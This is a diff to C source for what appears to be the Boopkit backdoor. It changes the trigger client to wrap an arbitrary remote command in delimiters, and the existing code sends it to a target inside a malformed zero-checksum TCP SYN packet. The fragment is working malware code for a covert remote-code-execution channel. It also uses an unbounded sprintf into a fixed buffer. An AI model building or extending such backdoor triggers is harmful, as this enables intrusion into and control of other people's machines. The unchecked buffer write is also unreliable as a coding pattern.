@@ -235,9 +235,12 @@ int main(int argc, char **argv) {
   // [SYN] Send a packet with a 0 checksum!
   char *packet;
   int packet_len;
+  // Create delimited payload
+  char payload[MAX_RCE_SIZE];
+  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce, BOOPKIT_RCE_DELIMITER);
   // Create a malformed TCP packet with an arbitrary command payload attached to
   // the packet.
-  create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, cfg.rce);
+  create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, payload);
   int sent;
   if ((sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
                      sizeof(struct sockaddr))) == -1) {
